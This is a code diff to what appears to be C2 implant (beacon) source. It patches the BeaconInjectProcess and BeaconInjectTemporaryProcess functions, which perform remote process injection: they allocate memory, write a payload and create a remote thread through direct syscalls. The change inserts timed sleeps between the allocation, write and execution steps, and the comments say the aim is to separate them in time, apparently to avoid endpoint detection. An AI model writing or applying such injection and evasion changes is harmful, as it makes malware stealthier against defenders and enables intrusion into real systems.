@@ -508,6 +508,9 @@ VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p
     if ( ! NT_SUCCESS( Status ) )
         return;
 
+    /* HVC-046: dissociate alloc->execute in time */
+    ExecDelaySleep();
+
     Status = SysNtWriteVirtualMemory(hProc, p_RemoteBuf, (PVOID)payload, Size, 0);
     if ( ! NT_SUCCESS( Status ) )
         return;
@@ -521,6 +524,9 @@ VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p
     Status = SysNtWriteVirtualMemory(hProc, a_RemoteBuf, (PVOID)arg, Size, 0);
     if ( ! NT_SUCCESS( Status ) )
         return;
+
+    /* HVC-046: dissociate write->execute in time */
+    ExecDelaySleep();
 
     Status = SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
     if ( ! NT_SUCCESS( Status ) )
@@ -541,6 +547,9 @@ VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, in
         return;
     }
 
+    /* HVC-046: dissociate alloc->execute in time */
+    ExecDelaySleep();
+
     Status = SysNtWriteVirtualMemory(pInfo->hProcess, p_RemoteBuf, (PVOID)payload, Size, 0);
     if (Status != STATUS_SUCCESS) {
         return;
@@ -557,6 +566,9 @@ VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, in
     if (Status != STATUS_SUCCESS) {
         return;
     }
+
+    /* HVC-046: dissociate write->execute in time */
+    ExecDelaySleep();
 
     SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
 }
